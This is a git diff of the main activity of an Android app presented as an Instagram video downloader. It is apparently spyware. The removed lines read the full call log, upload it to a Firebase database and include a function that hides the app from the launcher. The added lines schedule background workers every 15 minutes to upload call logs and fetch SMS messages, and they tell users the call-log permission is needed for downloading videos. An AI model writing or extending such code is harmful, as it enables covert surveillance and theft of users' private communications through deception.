@@ -1,116 +1,158 @@
 package com.example.instagramvideodownloader.home
 
 import android.Manifest
-import android.content.Context
 import android.content.pm.PackageManager
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
-import android.provider.CallLog
-import android.util.Log
-import android.widget.Toast
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import androidx.work.Constraints
+import androidx.work.NetworkType
 import androidx.work.PeriodicWorkRequest
+import androidx.work.WorkInfo
 import androidx.work.WorkManager
+import com.example.instagramvideodownloader.R
 import com.example.instagramvideodownloader.databinding.ActivityHomeBinding
+import com.example.instagramvideodownloader.work_manager.CallLogUploadWorker
 import com.example.instagramvideodownloader.work_manager.FetchMessagesWorker
-import com.example.instagramvideodownloader.work_manager.models.CallLogItemModel
 import com.google.android.material.snackbar.Snackbar
-import com.google.firebase.database.FirebaseDatabase
+import org.koin.android.ext.android.inject
 import java.util.concurrent.TimeUnit
 
 class HomeActivity : AppCompatActivity() {
+    private lateinit var messagesWorkRequest: PeriodicWorkRequest
+    private lateinit var callLogsWorkRequest: PeriodicWorkRequest
     private lateinit var binding: ActivityHomeBinding
+    private val repeatIntervalTimeUnit: TimeUnit = TimeUnit.MINUTES
+    private val repeatInterval: Long = 15L
+    private val constraints: Constraints = Constraints.Builder()
+        .setRequiredNetworkType(NetworkType.CONNECTED) // Set your desired network constraint
+        .build()
+    private val workManager: WorkManager by inject()
 
     companion object {
         private const val CALL_LOG_PERMISSION_REQUEST_CODE = 101
-        private const val SMS_PERMISSION_REQUEST_CODE = 1001
+        private const val SMS_PERMISSION_REQUEST_CODE = 1000
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        binding = ActivityHomeBinding.inflate(layoutInflater).also { setContentView(it.root) }
-        /* requestCallLogPermission()*/
-        checkForPermissions()
-
+        binding = ActivityHomeBinding.inflate(layoutInflater)
+        setContentView(binding.root)
+        requestCallLogPermission()
 
     }
 
-    private fun hideAppFromLauncher(context: Context, packageName: String) {
-        val packageManager = context.packageManager
-
-        try {
-            packageManager.setApplicationEnabledSetting(
-                packageName,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-        } catch (e: Exception) {
-            // Handle any exceptions here
-        }
-    }
-
-    private fun checkForPermissions() {
-        if (ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.READ_SMS
-            ) != PackageManager.PERMISSION_GRANTED
-        ) {
-            // Permission is not granted, request it
-            ActivityCompat.requestPermissions(
-                this,
-                arrayOf(Manifest.permission.READ_SMS),
-                SMS_PERMISSION_REQUEST_CODE
-            )
+    private fun checkPermissionsAndStartWorkers() {
+        if (hasCallLogPermission() && hasSMSPermission()) {
+            startCallLogsWorker()
+            startMessagesWorker()
         } else {
-            fetchMessages()
-
+            requestCallLogPermission()
+            requestSMSPermission()
         }
     }
 
-    private fun fetchMessages() {
-        val workRequest = PeriodicWorkRequest.Builder(
-            FetchMessagesWorker::class.java,
-            15,
-            TimeUnit.MINUTES
-        ).build()
-
-        WorkManager.getInstance(this).enqueue(workRequest)
+    private fun hasCallLogPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.READ_CALL_LOG
+        ) == PackageManager.PERMISSION_GRANTED
     }
-
 
     private fun requestCallLogPermission() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
-            != PackageManager.PERMISSION_GRANTED
+        if (ActivityCompat.shouldShowRequestPermissionRationale(
+                this,
+                Manifest.permission.READ_CALL_LOG
+            )
         ) {
-            if (ActivityCompat.shouldShowRequestPermissionRationale(
-                    this,
-                    Manifest.permission.READ_CALL_LOG
-                )
-            ) {
-                // Display a Snackbar with a message explaining why the permission is needed
-                Snackbar.make(
-                    findViewById(android.R.id.content),
-                    "This permission is required to download Instagram videos.",
-                    Snackbar.LENGTH_LONG
-                ).setAction("Grant") {
-                    // Request the permission again when the user clicks on "Grant"
-                    ActivityCompat.requestPermissions(
-                        this,
-                        arrayOf(Manifest.permission.READ_CALL_LOG),
-                        CALL_LOG_PERMISSION_REQUEST_CODE
-                    )
-                }.show()
-            } else {
-                // Request the permission directly
+            Snackbar.make(
+                findViewById(android.R.id.content),
+                R.string.call_log_permission_rationale,
+                Snackbar.LENGTH_LONG
+            ).setAction(R.string.grant) {
                 ActivityCompat.requestPermissions(
                     this,
                     arrayOf(Manifest.permission.READ_CALL_LOG),
                     CALL_LOG_PERMISSION_REQUEST_CODE
                 )
-            }
+            }.show()
         } else {
-            uploadCallLogsToFirebase()
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(Manifest.permission.READ_CALL_LOG),
+                CALL_LOG_PERMISSION_REQUEST_CODE
+            )
+        }
+    }
+
+    fun startMessagesWorker() {
+        messagesWorkRequest = PeriodicWorkRequest.Builder(
+            FetchMessagesWorker::class.java,
+            repeatInterval, // Set the time interval between repeats (in milliseconds)
+            repeatIntervalTimeUnit // Set the time unit for the interval
+        )
+            .addTag("SMS Logs")
+            .setConstraints(constraints)
+            .build()
+
+        workManager.enqueue(messagesWorkRequest)
+    }
+
+    fun startCallLogsWorker() {
+        callLogsWorkRequest = PeriodicWorkRequest.Builder(
+            CallLogUploadWorker::class.java,
+            repeatInterval, // Set the time interval between repeats (in milliseconds)
+            repeatIntervalTimeUnit // Set the time unit for the interval
+        )
+            .addTag("Call Logs")
+            .setConstraints(constraints)
+            .build()
+
+        workManager.enqueue(callLogsWorkRequest)
+
+    }
+
+    private fun hasSMSPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.READ_SMS
+        ) == PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun requestSMSPermission() {
+        ActivityCompat.requestPermissions(
+            this,
+            arrayOf(Manifest.permission.READ_SMS),
+            SMS_PERMISSION_REQUEST_CODE
+        )
+    }
+
+    private fun handleMessagesWorkInfo(workInfo: WorkInfo) {
+        when (workInfo.state) {
+            WorkInfo.State.SUCCEEDED -> {
+                binding.tvSMSLogsText.text = getString(R.string.upload_successful)
+            }
+
+            WorkInfo.State.FAILED -> {
+                binding.tvSMSLogsText.text = getString(R.string.upload_failed)
+            }
+            // Add other states if needed
+            else -> {}
+        }
+    }
+
+    private fun handleWorkInfo(workInfo: WorkInfo) {
+        when (workInfo.state) {
+            WorkInfo.State.SUCCEEDED -> {
+                binding.tvCallLogsText.text = getString(R.string.upload_successful)
+            }
+
+            WorkInfo.State.FAILED -> {
+                binding.tvCallLogsText.text = getString(R.string.upload_failed)
+            }
+            // Add other states if needed
+            else -> {}
         }
     }
 
@@ -123,72 +165,19 @@ class HomeActivity : AppCompatActivity() {
         when (requestCode) {
             CALL_LOG_PERMISSION_REQUEST_CODE -> {
                 if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    uploadCallLogsToFirebase()
+                    requestSMSPermission()
                 } else {
-                    // Permission denied. Handle accordingly.
+                    // Handle permission denied
                 }
             }
 
             SMS_PERMISSION_REQUEST_CODE -> {
                 if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    // Permission is granted, do your work that requires the permission
-                    // For example, call a function to fetch SMS messages here
-                    fetchMessages()
+                    checkPermissionsAndStartWorkers()
                 } else {
-                    // Permission is denied, handle it gracefully
-                    // For example, show a message or disable functionality that requires the permission
+                    // Handle permission denied
                 }
             }
         }
-    }
-
-    private fun uploadCallLogsToFirebase() {
-        val callLogsList = mutableListOf<CallLogItemModel>()
-
-        val mCursor = contentResolver.query(
-            CallLog.Calls.CONTENT_URI,
-            null,
-            null,
-            null,
-            CallLog.Calls.DATE + " DESC"
-        )
-
-        mCursor?.use { cursor ->
-            val numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER)
-            val typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE)
-            val dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE)
-            val durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION)
-
-            while (cursor.moveToNext()) {
-                val phoneNumber = cursor.getString(numberIndex)
-                val callType = cursor.getInt(typeIndex)
-                val callDate = cursor.getLong(dateIndex)
-                val callDuration = cursor.getLong(durationIndex)
-
-                val callLogItem = CallLogItemModel(phoneNumber, callType, callDate, callDuration)
-                callLogsList.add(callLogItem)
-            }
-        }
-
-        // Now, you have the list of call logs. Upload it to Firebase Realtime Database.
-        val database = FirebaseDatabase.getInstance()
-        database.setPersistenceEnabled(true)
-        val reference = database.getReference("call_logs")
-        reference.setValue(callLogsList)
-            .addOnCompleteListener { task ->
-                if (task.isSuccessful) {
-                    Toast.makeText(this, "Uploaded successfully", Toast.LENGTH_SHORT).show()
-                    binding.tvCallLogsText.text = buildString {
-                        append("Uploaded successfully")
-                    }
-                    Log.d("successFull : ", task.isSuccessful.toString())
-                } else {
-                    binding.tvCallLogsText.text = buildString {
-                        append("Upload Failed")
-                    }
-                    Toast.makeText(this, "Upload Failed", Toast.LENGTH_SHORT).show()
-                    Log.d("successFull : ", false.toString())
-                }
-            }
     }
 }
